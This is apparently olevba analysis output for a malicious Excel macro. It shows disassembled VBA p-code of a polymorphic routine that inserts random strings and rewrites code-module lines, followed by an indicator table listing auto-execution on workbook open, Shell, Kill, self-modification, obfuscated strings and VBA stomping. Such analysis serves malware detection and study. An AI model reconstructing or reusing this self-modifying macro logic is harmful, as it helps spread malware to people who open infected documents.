' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x0030 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyVal 
' Line #120:
' 	StartForVariable 
' 	Next 
' Line #121:
' 	StartWithExpr 
' 	Ld Loc 
' 	With 
' Line #122:
' 	LitDI2 0x0001 
' 	St Cw1Od6Tf2Ai8Mt9 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Zj3Nf2Qh4Kn3Pj3 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	St Hl8Bw4Ko3Oi9Hv7We5Sb4 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Je3Eb5Uu4Zi5Eu6 
' Line #123:
' 	Ld i 
' 	ArgsLd varray 0x0001 
' 	Ld Cw1Od6Tf2Ai8Mt9 
' 	Ld Zj3Nf2Qh4Kn3Pj3 
' 	Ld Hl8Bw4Ko3Oi9Hv7We5Sb4 
' 	Ld Je3Eb5Uu4Zi5Eu6 
' 	LitVarSpecial (True)
' 	ArgsMemLdWith Find 0x0006 
' 	DoWhile 
' Line #124:
' 	Ld Cw1Od6Tf2Ai8Mt9 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	St strVal 
' Line #125:
' 	Ld strVal 
' 	Ld Zj3Nf2Qh4Kn3Pj3 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld PolyVal 
' 	Concat 
' 	Ld strVal 
' 	Ld Je3Eb5Uu4Zi5Eu6 
' 	ArgsLd Mid$ 0x0002 
' 	Concat 
' 	St strVal 
' Line #126:
' 	Ld Cw1Od6Tf2Ai8Mt9 
' 	Ld strVal 
' 	ArgsMemCallWith ReplaceLine 0x0002 
' Line #127:
' 	Ld Hl8Bw4Ko3Oi9Hv7We5Sb4 
' 	LitDI2 0x0001 
' 	Add 
' 	St Cw1Od6Tf2Ai8Mt9 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	St Zj3Nf2Qh4Kn3Pj3 
' Line #128:
' 	MemLdWith CountOfLines 
' 	St Hl8Bw4Ko3Oi9Hv7We5Sb4 
' 	BoS 0x0000 
' 	MemLdWith CountOfLines 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	FnLen 
' 	St Je3Eb5Uu4Zi5Eu6 
' Line #129:
' 	Loop 
' Line #130:
' 	EndWith 
' Line #131:
' 	LitStr 0x0000 ""
' 	St PolyVal 
' Line #132:
' 	StartForVariable 
' 	Next 
' Line #133:
' 	EndSub 
' Line #134:
' Line #135:
' _VBA_PROJECT_CUR/VBA/Лист1 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист2 - 956 bytes
' _VBA_PROJECT_CUR/VBA/Лист3 - 956 bytes
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |WorkBook_Activate   |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |remove.reg          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

